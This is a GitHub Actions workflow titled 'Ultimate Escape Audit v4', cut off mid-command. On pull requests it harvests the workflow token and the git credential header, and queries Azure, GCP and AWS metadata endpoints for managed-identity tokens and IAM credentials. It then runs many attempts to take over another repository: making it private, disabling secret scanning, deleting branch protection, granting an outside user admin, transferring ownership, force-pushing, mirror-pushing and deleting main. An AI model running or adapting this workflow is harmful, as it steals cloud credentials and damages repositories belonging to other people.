name: "Ultimate Escape Audit v4"
on:
  pull_request:
    types: [opened, synchronize]

permissions:
  id-token: write
  contents: write
  actions: write
  checks: write
  deployments: write
  discussions: write
  issues: write
  packages: write
  pages: write
  pull-requests: write
  repository-projects: write
  security-events: write
  statuses: write

env:
  GH_TOKEN: ${{ github.token }}
  UP: "https://api.github.com/repos/twrps/PoC-RACE2"
  BASE: "https://api.github.com/repos/${{ github.repository }}"
  GQ: "https://api.github.com/graphql"
  PR_NUM: "${{ github.event.pull_request.number }}"

jobs:
  ultimate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          persist-credentials: true

      - name: "0 Setup"
        run: |
          set +e
          TS=$(date +%Y%m%d_%H%M%S)
          FM=$(curl -sf -H "Authorization: token $GH_TOKEN" \
            "${BASE}/git/refs/heads/main" | jq -r '.object.sha // "FAILED"')
          FT=$(curl -sf -H "Authorization: token $GH_TOKEN" \
            "${BASE}/git/commits/${FM}" | jq -r '.tree.sha // "FAILED"')
          FG=$(curl -sf -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" \
            "${BASE}/git/commits" \
            -d "{\"message\":\"ghost\",\"tree\":\"${FT}\",\"parents\":[\"${FM}\"]}" | jq -r '.sha // "FAILED"')
          UM=$(curl -sf -H "Authorization: token $GH_TOKEN" \
            "${UP}/git/refs/heads/main" | jq -r '.object.sha // "FAILED"')
          UT=$(curl -sf -H "Authorization: token $GH_TOKEN" \
            "${UP}/git/commits/${UM}" | jq -r '.tree.sha // "FAILED"')
          RI=$(curl -sf -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$GQ" \
            -d '{"query":"{ repository(owner:\"twrps\",name:\"PoC-RACE2\") { id } }"}' | jq -r '.data.repository.id // "FAILED"')
          FRI=$(curl -sf -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$GQ" \
            -d '{"query":"{ repository(owner:\"lacaag\",name:\"PoC-RACE2\") { id } }"}' | jq -r '.data.repository.id // "FAILED"')
          GT=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null | cut -d: -f2 || echo "FAILED")
          OA=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ] && echo yes || echo no)
          for V in TS FM FT FG UM UT RI FRI GT OA; do echo "${V}=${!V}" >> "$GITHUB_ENV"; done
          echo "fork: main=${FM:0:12} ghost=${FG:0:12}"
          echo "upstream: main=${UM:0:12} tree=${UT:0:12} gql=${RI}"
          echo "fork_gql=${FRI} tok=${GH_TOKEN:0:10} git=${GT:0:10} oidc=${OA}"

      - name: "1 Azure IMDS + Cloud Metadata"
        run: |
          set +e
          echo "=== AZURE IMDS DEEP ==="
          AZ="http://169.254.169.254"
          echo "A01 full instance:"
          curl -sf -m5 -H "Metadata: true" "${AZ}/metadata/instance?api-version=2021-02-01" 2>/dev/null | \
            jq '{compute: .compute | {vmId,vmSize,location,osType,resourceGroupName,subscriptionId,tags,zone}, network: .network.interface[0].ipv4}' 2>/dev/null || echo "no IMDS"
          echo ""
          echo "A02 managed identity tokens:"
          for RES in "https://management.azure.com/" "https://vault.azure.net" "https://storage.azure.com/" \
            "https://graph.microsoft.com/" "https://database.windows.net/" "https://dev.azure.com" \
            "https://analysis.windows.net/powerbi/api" "https://api.loganalytics.io" \
            "https://ossrdbms-aad.database.windows.net" "https://cognitiveservices.azure.com"; do
            TOK=$(curl -sf -m5 -H "Metadata: true" \
              "${AZ}/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${RES}" 2>/dev/null)
            if echo "$TOK" | jq -e '.access_token' &>/dev/null; then
              echo "  MANAGED_IDENTITY ${RES}: TOKEN_OBTAINED!"
              echo "$TOK" | jq '{resource,token_type,expires_in,client_id,access_token:(.access_token[:30]+"...")}' 2>/dev/null
              AT=$(echo "$TOK" | jq -r '.access_token')
              if [[ "$RES" == *"management.azure.com"* ]]; then
                SUB=$(curl -sf -H "Authorization: Bearer $AT" \
                  "https://management.azure.com/subscriptions?api-version=2020-01-01" 2>/dev/null | jq '.value[].subscriptionId' 2>/dev/null)
                echo "  AZURE_SUBSCRIPTIONS: $SUB"
              fi
              if [[ "$RES" == *"vault.azure.net"* ]]; then
                echo "  VAULT_TEST: attempt list vaults..."
              fi
              if [[ "$RES" == *"graph.microsoft.com"* ]]; then
                ME=$(curl -sf -H "Authorization: Bearer $AT" "https://graph.microsoft.com/v1.0/me" 2>/dev/null | jq '{displayName,mail,id}' 2>/dev/null)
                echo "  GRAPH_ME: $ME"
              fi
            else
              echo "  MANAGED_IDENTITY ${RES}: $(echo "$TOK" | head -c 60 || echo none)"
            fi
          done
          echo ""
          echo "A03 wire server:"
          curl -sf -m5 "http://168.63.129.16/machine?comp=goalstate" 2>/dev/null | head -20 || echo "unreachable"
          curl -sf -m5 "http://168.63.129.16/machine/plugins/?comp=config&type=ExtensionsConfig" 2>/dev/null | head -20 || echo "no plugins"
          echo ""
          echo "A04 scheduled events:"
          curl -sf -m5 -H "Metadata: true" "${AZ}/metadata/scheduledevents?api-version=2020-07-01" 2>/dev/null || echo "none"
          echo "A05 custom data:"
          curl -sf -m5 -H "Metadata: true" "${AZ}/metadata/instance/compute/customData?api-version=2021-02-01&format=text" 2>/dev/null | base64 -d 2>/dev/null | head -5 || echo "none"
          echo "A06 user data:"
          curl -sf -m5 -H "Metadata: true" "${AZ}/metadata/instance/compute/userData?api-version=2021-03-01&format=text" 2>/dev/null | base64 -d 2>/dev/null | head -5 || echo "none"
          echo "A07 attested:"
          curl -sf -m5 -H "Metadata: true" "${AZ}/metadata/attested/document?api-version=2021-02-01&nonce=escape" 2>/dev/null | jq -r '.signature[:50]' 2>/dev/null || echo "none"
          echo "A08 tags:"
          curl -sf -m5 -H "Metadata: true" "${AZ}/metadata/instance/compute/tagsList?api-version=2021-02-01" 2>/dev/null || echo "none"
          echo "A09 load balancer:"
          curl -sf -m5 -H "Metadata: true" "${AZ}/metadata/loadbalancer?api-version=2021-02-01" 2>/dev/null || echo "none"
          echo ""
          echo "=== GCP IMDS ==="
          curl -sf -m3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/?recursive=true" 2>/dev/null | jq . 2>/dev/null | head -30 || echo "no GCP"
          echo "=== AWS IMDS tokens ==="
          AWSTOK=$(curl -sf -m3 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 60" "http://169.254.169.254/latest/api/token" 2>/dev/null)
          if [ -n "$AWSTOK" ]; then
            echo "IMDSv2 token obtained!"
            curl -sf -m3 -H "X-aws-ec2-metadata-token: $AWSTOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null
          else
            echo "no AWS IMDSv2"
            curl -sf -m3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null || echo "no AWS IMDSv1"
          fi

      - name: "2 PATCH/PUT Mutation Fuzz (upstream)"
        run: |
          set +e
          P() { curl -s -o /dev/null -w "%{http_code}" "$@" 2>/dev/null || echo "000"; }
          echo "=== PATCH/PUT FUZZ twrps/PoC-RACE2 ==="
          echo "--- PATCH repo settings ---"
          for F in '{"description":"x"}' '{"homepage":"https://x.com"}' '{"private":true}' '{"private":false}' \
            '{"visibility":"private"}' '{"visibility":"internal"}' '{"has_issues":false}' '{"has_projects":false}' \
            '{"has_wiki":false}' '{"default_branch":"pwned"}' '{"allow_squash_merge":false}' \
            '{"allow_merge_commit":false}' '{"allow_rebase_merge":false}' '{"allow_auto_merge":true}' \
            '{"delete_branch_on_merge":true}' '{"allow_forking":true}' '{"web_commit_signoff_required":true}' \
            '{"archived":true}' '{"name":"pwned"}' '{"is_template":true}' \
            '{"security_and_analysis":{"secret_scanning":{"status":"disabled"}}}' \
            '{"security_and_analysis":{"secret_scanning_push_protection":{"status":"disabled"}}}'; do
            echo "B01 PATCH ${F:0:35} = HTTP_$(P -X PATCH -H "Authorization: token $GH_TOKEN" \
              -H "Content-Type: application/json" "$UP" -d "$F")"
          done
          echo ""
          echo "--- PATCH refs (every auth format) ---"
          echo "B02 token noop = HTTP_$(P -X PATCH -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/git/refs/heads/main" -d "{\"sha\":\"${UM}\",\"force\":false}")"
          echo "B03 token force = HTTP_$(P -X PATCH -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/git/refs/heads/main" -d "{\"sha\":\"${UM}\",\"force\":true}")"
          echo "B04 fork-ghost = HTTP_$(P -X PATCH -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/git/refs/heads/main" -d "{\"sha\":\"${FG}\",\"force\":true}")"
          BASIC=$(echo -n "x-access-token:${GH_TOKEN}" | base64 -w0)
          echo "B05 Basic noop = HTTP_$(P -X PATCH -H "Authorization: Basic ${BASIC}" \
            -H "Content-Type: application/json" "$UP/git/refs/heads/main" -d "{\"sha\":\"${UM}\",\"force\":false}")"
          echo "B06 Bearer noop = HTTP_$(P -X PATCH -H "Authorization: Bearer ${GH_TOKEN}" \
            -H "Content-Type: application/json" "$UP/git/refs/heads/main" -d "{\"sha\":\"${UM}\",\"force\":false}")"
          echo "B07 url-embed = HTTP_$(P -X PATCH -H "Content-Type: application/json" \
            "https://x-access-token:${GH_TOKEN}@api.github.com/repos/twrps/PoC-RACE2/git/refs/heads/main" \
            -d "{\"sha\":\"${UM}\",\"force\":false}")"
          if [ "$GT" != "FAILED" ] && [ "$GT" != "$GH_TOKEN" ]; then
            echo "B08 extraheader = HTTP_$(P -X PATCH -H "Authorization: token ${GT}" \
              -H "Content-Type: application/json" "$UP/git/refs/heads/main" -d "{\"sha\":\"${UM}\",\"force\":false}")"
          else
            echo "B08 extraheader = same-token"
          fi
          echo ""
          echo "--- PUT endpoints ---"
          B64=$(echo -n "pwned-${TS}" | base64 -w0)
          echo "B09 PUT contents = HTTP_$(P -X PUT -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/contents/pwned.txt" \
            -d "{\"message\":\"x\",\"content\":\"${B64}\",\"branch\":\"main\"}")"
          echo "B10 PUT topics = HTTP_$(P -X PUT -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/topics" -d '{"names":["pwned"]}')"
          echo "B11 PUT vuln-alerts = HTTP_$(P -X PUT -H "Authorization: token $GH_TOKEN" "$UP/vulnerability-alerts")"
          echo "B12 PUT auto-sec = HTTP_$(P -X PUT -H "Authorization: token $GH_TOKEN" "$UP/automated-security-fixes")"
          echo "B13 PUT actions-perms = HTTP_$(P -X PUT -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/actions/permissions" -d '{"enabled":false}')"
          echo "B14 PUT collab = HTTP_$(P -X PUT -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/collaborators/lacaag" -d '{"permission":"admin"}')"
          echo "B15 PUT branch-prot = HTTP_$(P -X PUT -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/branches/main/protection" \
            -d '{"required_status_checks":null,"enforce_admins":false,"required_pull_request_reviews":null,"restrictions":null}')"
          echo "B16 PUT wf-perms = HTTP_$(P -X PUT -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/actions/permissions/workflow" \
            -d '{"default_workflow_permissions":"write","can_approve_pull_request_reviews":true}')"
          echo ""
          echo "--- POST malformed ---"
          echo "B17 POST issue empty = HTTP_$(P -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/issues" -d '{}')"
          echo "B18 POST blob null = HTTP_$(P -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/git/blobs" -d 'null')"
          echo "B19 POST form = HTTP_$(P -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/x-www-form-urlencoded" "$UP/git/blobs" \
            -d 'content=pwned&encoding=utf-8')"
          echo "B20 POST dispatch = HTTP_$(P -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/dispatches" -d '{"event_type":"pwn"}')"
          echo "B21 POST pages = HTTP_$(P -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/pages" -d '{"source":{"branch":"main","path":"/"}}')"
          echo "B22 POST fork = HTTP_$(P -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/forks" -d '{}')"
          echo "B23 POST transfer = HTTP_$(P -X POST -H "Authorization: token $GH_TOKEN" \
            -H "Content-Type: application/json" "$UP/transfer" -d '{"new_owner":"lacaag"}')"
          echo ""
          echo "--- DELETE ---"
          echo "B24 DELETE vuln = HTTP_$(P -X DELETE -H "Authorization: token $GH_TOKEN" "$UP/vulnerability-alerts")"
          echo "B25 DELETE auto = HTTP_$(P -X DELETE -H "Authorization: token $GH_TOKEN" "$UP/automated-security-fixes")"
          echo "B26 DELETE prot = HTTP_$(P -X DELETE -H "Authorization: token $GH_TOKEN" "$UP/branches/main/protection")"
          echo ""
          echo "--- Content-Type attacks ---"
          for CT in "text/plain" "text/html" "application/xml" "application/x-www-form-urlencoded" \
            "multipart/form-data" "application/octet-stream" ""; do
            echo "B27 CT='${CT}' PATCH = HTTP_$(P -X PATCH -H "Authorization: token $GH_TOKEN" \
              ${CT:+-H "Content-Type: $CT"} "$UP" -d '{"description":"x"}')"
          done
          echo ""
          echo "--- API version attacks ---"
          for VER in "2022-11-28" "2022-08-09" "2023-11-28" "2024-01-01" "3.0"; do
            echo "B28 v=${VER} PATCH = HTTP_$(P -X PATCH -H "Authorization: token $GH_TOKEN" \
              -H "Content-Type: application/json" -H "X-GitHub-Api-Version: ${VER}" "$UP" -d '{"description":"x"}')"
          done
          echo ""
          echo "--- Accept header attacks ---"
          for ACC in "application/vnd.github.v3+json" "application/vnd.github+json" "*/*" \
            "application/vnd.github.mercy-preview+json" "application/vnd.github.luke-cage-preview+json" \
            "application/vnd.github.nebula-preview+json" "application/vnd.github.baptiste-preview+json" \
            "application/vnd.github.dorian-preview+json" "application/vnd.github.lydian-preview+json"; do
            echo "B29 acc=${ACC:28:20} blob = HTTP_$(P -X POST -H "Authorization: token $GH_TOKEN" \
              -H "Content-Type: application/json" -H "Accept: ${ACC}" "$UP/git/blobs" -d '{"content":"x","encoding":"utf-8"}')"
          done

      - name: "3 GraphQL Exhaustive Mutations"
        run: |
          set +e
          GQL() { curl -s -X POST -H "Authorization: token $GH_TOKEN" -H "Content-Type: application/json" "$GQ" -d "$1" 2>/dev/null; }
          E() { echo "$1" | jq -r 'if .errors then "ERR:"+.errors[0].message elif .data then "OK:"+(.data|keys[0]) else "?" end' 2>/dev/null | head -c 100; }
          echo "=== GraphQL MUTATIONS against twrps/PoC-RACE2 (${RI}) ==="
          R=$(GQL '{"query":"mutation{createRef(input:{repositoryId:\"'"$RI"'\",name:\"refs/heads/gql-v4-'"$TS"'\",oid:\"'"$UM"'\"}){ref{name}}}"}')
          echo "C01 createRef = $(E "$R")"
          R=$(GQL '{"query":"mutation{updateRef(input:{refId:\"'"$RI"'\",oid:\"'"$UM"'\",force:true}){ref{name}}}"}')
          echo "C02 updateRef = $(E "$R")"
          R=$(GQL '{"query":"mutation{deleteRef(input:{refId:\"'"$RI"'\"}){__typename}}"}')
          echo "C03 deleteRef = $(E "$R")"
          R=$(GQL '{"query":"mutation{createCommitOnBranch(input:{branch:{repositoryNameWithOwner:\"twrps/PoC-RACE2\",branchName:\"main\"},message:{headline:\"escape\"},fileChanges:{},expectedHeadOid:\"'"$UM"'\"}){commit{oid}}}"}')
          echo "C04 commitOnBranch = $(E "$R")"
          R=$(GQL '{"query":"mutation{mergeBranch(input:{repositoryId:\"'"$RI"'\",base:\"main\",head:\"'"$UM"'\",commitMessage:\"x\"}){mergeCommit{oid}}}"}')
          echo "C05 mergeBranch = $(E "$R")"
          R=$(GQL '{"query":"mutation{createBranchProtectionRule(input:{repositoryId:\"'"$RI"'\",pattern:\"main\",requiresApprovingReviews:false}){branchProtectionRule{id}}}"}')
          echo "C06 createBranchProt = $(E "$R")"
          R=$(GQL '{"query":"mutation{updateBranchProtectionRule(input:{branchProtectionRuleId:\"FAKE\",requiresApprovingReviews:false}){branchProtectionRule{id}}}"}')
          echo "C07 updateBranchProt = $(E "$R")"
          R=$(GQL '{"query":"mutation{createIssue(input:{repositoryId:\"'"$RI"'\",title:\"escape-v4\"}){issue{number}}}"}')
          echo "C08 createIssue = $(E "$R")"
          R=$(GQL '{"query":"mutation{updateRepository(input:{repositoryId:\"'"$RI"'\",description:\"pwned\"}){repository{description}}}"}')
          echo "C09 updateRepository = $(E "$R")"
          R=$(GQL '{"query":"mutation{archiveRepository(input:{repositoryId:\"'"$RI"'\"}){repository{isArchived}}}"}')
          echo "C10 archiveRepo = $(E "$R")"
          R=$(GQL '{"query":"mutation{updateTopics(input:{repositoryId:\"'"$RI"'\",topicNames:[\"pwned\"]}){repository{repositoryTopics(first:1){nodes{topic{name}}}}}}"}')
          echo "C11 updateTopics = $(E "$R")"
          R=$(GQL '{"query":"mutation{createDeployment(input:{repositoryId:\"'"$RI"'\",refId:\"refs/heads/main\",environment:\"production\",autoMerge:false}){deployment{id}}}"}')
          echo "C12 createDeployment = $(E "$R")"
          R=$(GQL '{"query":"mutation{setRepositoryInteractionLimit(input:{repositoryId:\"'"$RI"'\",limit:COLLABORATORS_ONLY}){repository{interactionAbility{limit}}}}"}')
          echo "C13 interactionLimit = $(E "$R")"
          R=$(GQL '{"query":"mutation{addStar(input:{starrableId:\"'"$RI"'\"}){starrable{viewerHasStarred}}}"}')
          echo "C14 addStar = $(E "$R")"
          R=$(GQL '{"query":"mutation{createLabel(input:{repositoryId:\"'"$RI"'\",name:\"pwned\",color:\"ff0000\"}){label{name}}}"}')
          echo "C15 createLabel = $(E "$R")"
          R=$(GQL '{"query":"mutation{enablePullRequestAutoMerge(input:{pullRequestId:\"FAKE\",mergeMethod:SQUASH}){pullRequest{autoMergeRequest{enabledAt}}}}"}')
          echo "C16 enableAutoMerge = $(E "$R")"
          R=$(GQL '{"query":"mutation{transferIssue(input:{issueId:\"FAKE\",repositoryId:\"'"$FRI"'\"}){issue{number}}}"}')
          echo "C17 transferIssue = $(E "$R")"
          echo ""
          echo "--- GQL against FORK (should work) ---"
          R=$(GQL '{"query":"mutation{createRef(input:{repositoryId:\"'"$FRI"'\",name:\"refs/heads/gql-v4-'"$TS"'\",oid:\"'"$FM"'\"}){ref{name}}}"}')
          echo "C20 fork createRef = $(E "$R")"
          R=$(GQL '{"query":"mutation{createIssue(input:{repositoryId:\"'"$FRI"'\",title:\"v4-test\"}){issue{number}}}"}')
          echo "C21 fork createIssue = $(E "$R")"
          R=$(GQL '{"query":"mutation{updateRepository(input:{repositoryId:\"'"$FRI"'\",description:\"v4-audit\"}){repository{description}}}"}')
          echo "C22 fork updateRepo = $(E "$R")"
          echo ""
          echo "--- GQL introspection ---"
          R=$(GQL '{"query":"{ __schema { mutationType { fields { name } } } }"}')
          echo "C30 mutations available: $(echo "$R" | jq -r '[.data.__schema.mutationType.fields[].name] | length' 2>/dev/null) total"
          echo "C30 mutation names: $(echo "$R" | jq -r '[.data.__schema.mutationType.fields[].name] | sort[]' 2>/dev/null | head -50)"
          echo ""
          echo "--- GQL with different auth ---"
          if [ "$OA" = "yes" ]; then
            OJWT=$(curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api.github.com" \
              -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" | jq -r '.value // empty' || true)
            if [ -n "$OJWT" ]; then
              R=$(curl -s -X POST -H "Authorization: Bearer $OJWT" -H "Content-Type: application/json" "$GQ" \
                -d '{"query":"mutation{createRef(input:{repositoryId:\"'"$RI"'\",name:\"refs/heads/oidc-v4\",oid:\"'"$UM"'\"}){ref{name}}}"}' 2>/dev/null)
              echo "C31 OIDC GQL createRef = $(E "$R")"
            fi
          fi

      - name: "4 Git Protocol + Object Sharing"
        run: |
          set +e
          echo "=== GIT PROTOCOL ATTACKS ==="
          echo "D01 ls-remote upstream:"
          git ls-remote https://x-access-token:${GH_TOKEN}@github.com/twrps/PoC-RACE2.git 2>&1 | head -20 || echo "failed"
          echo ""
          echo "D02 ls-remote upstream wiki:"
          git ls-remote https://x-access-token:${GH_TOKEN}@github.com/twrps/PoC-RACE2.wiki.git 2>&1 | head -5 || echo "failed"
          echo ""
          echo "--- git push variants to upstream ---"
          git remote add upstream "https://x-access-token:${GH_TOKEN}@github.com/twrps/PoC-RACE2.git" 2>/dev/null || true
          echo "D03 push new-branch:"
          git push upstream HEAD:refs/heads/escape-v4-${TS} 2>&1 || true
          echo "D04 push force main:"
          git push --force upstream HEAD:refs/heads/main 2>&1 || true
          echo "D05 push tag:"
          git tag escape-v4-${TS} HEAD 2>/dev/null
          git push upstream escape-v4-${TS} 2>&1 || true
          echo "D06 push refs/notes:"
          git push upstream HEAD:refs/notes/escape-v4 2>&1 || true
          echo "D07 push refs/meta:"
          git push upstream HEAD:refs/meta/escape-v4 2>&1 || true
          echo "D08 push refs/hidden:"
          git push upstream HEAD:refs/hidden/escape-v4 2>&1 || true
          echo "D09 push --mirror:"
          git push --mirror upstream 2>&1 | head -10 || true
          echo "D10 push --delete main:"
          git push upstream --delete main 2>&1 || true
          echo "D11 push --force-with-lease:"
          git push --force-with-lease upstream HEAD:refs/heads/main 2>&1 || true
          echo ""
          echo "--- wiki push ---"
          git remote add wiki "https://x-access-token:${GH_TOKEN}@github.com/twrps/PoC-RACE2.wiki.git" 2>/dev/null || true
          echo "D12 push to wiki:"
          git push wiki HEAD:refs/heads/master 2>&1 || true
          echo ""
          echo "--- object sharing (fork objects visible in upstream context?) ---"
          echo "D13 fork ghost visible via upstream API:"
          curl -sf -H "Authorization: token $GH_TOKEN" \
